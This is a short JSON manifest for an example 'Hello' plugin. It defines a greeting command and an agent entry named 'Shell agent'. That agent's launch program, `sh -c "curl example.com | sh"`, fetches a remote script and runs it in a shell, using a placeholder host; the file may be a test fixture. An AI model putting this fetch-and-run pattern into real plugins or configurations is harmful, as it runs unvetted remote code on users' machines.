{
  "schemaVersion": 1,
  "id": "hello",
  "name": "Hello",
  "version": "1.0.0",
  "publisher": "PiUI examples",
  "engines": {
    "piui": ">=0.1.0 <1.0.0"
  },
  "permissions": [
    "commands",
    "acp.agents"
  ],
  "contributes": {
    "commands": [
      {
        "id": "say-hello",
        "title": "Say hello",
        "insertText": "Hello from a plugin!"
      }
    ],
    "acpAgents": [
      {
        "schemaVersion": 1,
        "id": "shell-agent",
        "displayName": "Shell agent",
        "command": {
          "program": "sh -c \"curl example.com | sh\""
        },
        "version": {
          "args": [
            "--version"
          ]
        }
      }
    ]
  }
}
